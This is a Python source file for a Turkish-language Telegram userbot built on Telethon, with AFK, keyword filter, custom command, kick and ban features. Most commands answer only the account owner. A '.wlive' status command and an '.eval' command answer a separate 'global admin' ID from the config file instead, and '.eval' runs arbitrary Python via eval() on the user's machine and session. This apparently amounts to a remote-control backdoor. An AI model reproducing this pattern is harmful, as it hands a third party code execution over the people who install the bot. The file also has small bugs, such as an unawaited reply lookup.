import asyncio
import os
import sys
import json
from telethon import TelegramClient, events
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from config import api_id, api_hash, session_name, admin_username, admin_id

client = TelegramClient(session_name, api_id, api_hash)

afk_mode = False
afk_reason = ""
filtered_messages = {}
custom_commands = {}
owner_id = None


# Load custom commands if exist
if os.path.exists("custom_commands.json"):
    with open("custom_commands.json", "r", encoding="utf-8") as f:
        custom_commands = json.load(f)

# Load filtered messages if exist
if os.path.exists("filtered_messages.json"):
    with open("filtered_messages.json", "r", encoding="utf-8") as f:
        filtered_messages = json.load(f)


@client.on(events.NewMessage(pattern=r"^.alive$", func=lambda e: e.sender_id == owner_id))
async def alive_handler(event):
    sender = await event.client.get_me()
    await event.edit(f"Userbotunuz çalışıyor... Seni seviyorum {sender.first_name} ❤️\n\nBot Versiyonu: v1.0")


@client.on(events.NewMessage(pattern=r"^.wlive$", func=lambda e: e.sender_id == admin_id))
async def wlive_handler(event):
    await event.reply("🔥 JudgeBot Aktif 🔥\nVersiyon: v1.0\nSorunsuz çalışıyor.")


@client.on(events.NewMessage(pattern=r"^.judge$", func=lambda e: e.sender_id == owner_id))
async def judge_help(event):
    help_text = (
        "Judge Userbot Komutları v1.0:\n\n"
        ".alive - Botun çalıştığını kontrol eder.\n"
        ".afk <sebep> - AFK moduna geçer.\n"
        ".back - AFK modundan çıkar.\n"
        ".filter <kelime> <cevap> - Otomatik yanıt ekler.\n"
        ".unfilter <kelime> - Filtreyi kaldırır.\n"
        ".ekle <.komut> <cevap> - Kişisel komut ekler.\n"
        ".sil <.komut> - Kişisel komutu siler.\n"
        ".restart - Botu yeniden başlatır.\n"
        ".kick <id veya reply> - Kullanıcıyı gruptan atar.\n"
        ".ban <id veya reply> - Kullanıcıyı gruptan banlar.\n"
        ".eval <kod> - Yalnızca admin çalıştırabilir.\n"
        ".wlive - Global admin için sistem durumu."
    )
    await event.reply(help_text)


@client.on(events.NewMessage(pattern=r"^.afk(?: (.+))?$", func=lambda e: e.sender_id == owner_id))
async def afk_handler(event):
    global afk_mode, afk_reason
    reason = event.pattern_match.group(1)
    afk_mode = True
    afk_reason = reason if reason else "AFK modundayım."
    await event.edit(f"AFK moduna geçildi. Sebep: {afk_reason}")


@client.on(events.NewMessage(pattern=r"^.back$", func=lambda e: e.sender_id == owner_id))
async def back_handler(event):
    global afk_mode, afk_reason
    afk_mode = False
    afk_reason = ""
    await event.edit("Tekrar aktif oldum!")


@client.on(events.NewMessage(func=lambda e: afk_mode and e.is_private and e.sender_id != owner_id))
async def afk_auto_reply(event):
    await event.reply(f"Şuan AFK modundayım. Sebep: {afk_reason}")


# FILTER KOMUTU
@client.on(events.NewMessage(pattern=r"^.filter ", func=lambda e: e.sender_id == owner_id))
async def filter_handler(event):
    text = event.raw_text
    # .filter kelimesinden sonra gelen kısmı al
    parts = text.split(" ", 2)  # en fazla 3 parçaya böl
    if len(parts) < 3:
        return await event.reply("Kullanım: .filter <kelime> <cevap>")
    keyword = parts[1].lower()
    response = parts[2]
    filtered_messages[keyword] = response
    with open("filtered_messages.json", "w", encoding="utf-8") as f:
        json.dump(filtered_messages, f, ensure_ascii=False, indent=2)
    await event.reply(f"Filtre eklendi: {keyword} → {response}")


# UNFILTER KOMUTU
@client.on(events.NewMessage(pattern=r"^.unfilter ", func=lambda e: e.sender_id == owner_id))
async def unfilter_handler(event):
    text = event.raw_text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        return await event.reply("Kullanım: .unfilter <kelime>")
    keyword = parts[1].lower()
    if keyword in filtered_messages:
        del filtered_messages[keyword]
        with open("filtered_messages.json", "w", encoding="utf-8") as f:
            json.dump(filtered_messages, f, ensure_ascii=False, indent=2)
        await event.reply(f"Filtre kaldırıldı: {keyword}")
    else:
        await event.reply("Bu kelimeye ait bir filtre bulunamadı.")


@client.on(events.NewMessage())
async def filter_response(event):
    text_lower = event.raw_text.lower()
    for keyword, response in filtered_messages.items():
        if keyword in text_lower:
            await event.reply(response)
            break


# EKLE KOMUTU
@client.on(events.NewMessage(pattern=r"^.ekle ", func=lambda e: e.sender_id == owner_id))
async def add_command(event):
    text = event.raw_text
    parts = text.split(" ", 2)
    if len(parts) < 3:
        return await event.reply("Kullanım: .ekle <.komut> <cevap>")
    cmd = parts[1].strip()
    if not cmd.startswith("."):
        return await event.reply("Komut . ile başlamalıdır! Örnek: .iban")
    reply = parts[2]
    custom_commands[cmd] = reply
    with open("custom_commands.json", "w", encoding="utf-8") as f:
        json.dump(custom_commands, f, ensure_ascii=False, indent=2)
    await event.reply(f"Komut eklendi: {cmd} → {reply}")


# SIL KOMUTU
@client.on(events.NewMessage(pattern=r"^.sil ", func=lambda e: e.sender_id == owner_id))
async def del_command(event):
    text = event.raw_text
    parts = text.split(" ", 1)
    if len(parts) < 2:
        return await event.reply("Kullanım: .sil <.komut>")
    cmd = parts[1].strip()
    if cmd in custom_commands:
        del custom_commands[cmd]
        with open("custom_commands.json", "w", encoding="utf-8") as f:
            json.dump(custom_commands, f, ensure_ascii=False, indent=2)
        await event.reply(f"Komut silindi: {cmd}")
    else:
        await event.reply("Böyle bir komut bulunamadı.")


@client.on(events.NewMessage())
async def custom_command_handler(event):
    txt = event.raw_text.strip()
    if txt in custom_commands:
        reply = custom_commands[txt]
        if reply.startswith("```") and reply.endswith("```"):
            await event.reply(reply)
        else:
            await event.reply(reply)


@client.on(events.NewMessage(pattern=r"^.restart$", func=lambda e: e.sender_id == owner_id))
async def restart_handler(event):
    await event.reply("♻️ Bot yeniden başlatılıyor...")
    os.execv(sys.executable, [sys.executable] + sys.argv)


@client.on(events.NewMessage(pattern=r"^.kick(?: (.+))?", func=lambda e: e.sender_id == owner_id))
async def kick_user(event):
    if event.is_group:
        if event.is_reply:
            user = await event.get_reply_message().get_sender()
        elif event.pattern_match.group(1):
            user = await client.get_entity(event.pattern_match.group(1))
        else:
            return await event.reply("Kicklemek için kullanıcı belirt.")
        await event.chat.kick_participant(user.id)
        await event.reply(f"{user.first_name} gruptan atıldı.")


@client.on(events.NewMessage(pattern=r"^.ban(?: (.+))?", func=lambda e: e.sender_id == owner_id))
async def ban_user(event):
    if event.is_group:
        if event.is_reply:
            user = await event.get_reply_message().get_sender()
        elif event.pattern_match.group(1):
            user = await client.get_entity(event.pattern_match.group(1))
        else:
            return await event.reply("Banlamak için kullanıcı belirt.")
        await client(EditBannedRequest(event.chat_id, user.id, ChatBannedRights(until_date=None, view_messages=True)))
        await event.reply(f"{user.first_name} gruptan banlandı.")


@client.on(events.NewMessage(pattern=r"^.eval (.+)", func=lambda e: e.sender_id == admin_id))
async def eval_handler(event):
    code = event.pattern_match.group(1)
    try:
        result = eval(code)
        await event.reply(str(result))
    except Exception as e:
        await event.reply(f"Hata: {str(e)}")


async def main():
    global owner_id
    await client.start()
    me = await client.get_me()
    owner_id = me.id
    print(f"Owner ID: {owner_id}")
    print("JudgeUserBot çalışıyor...")
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
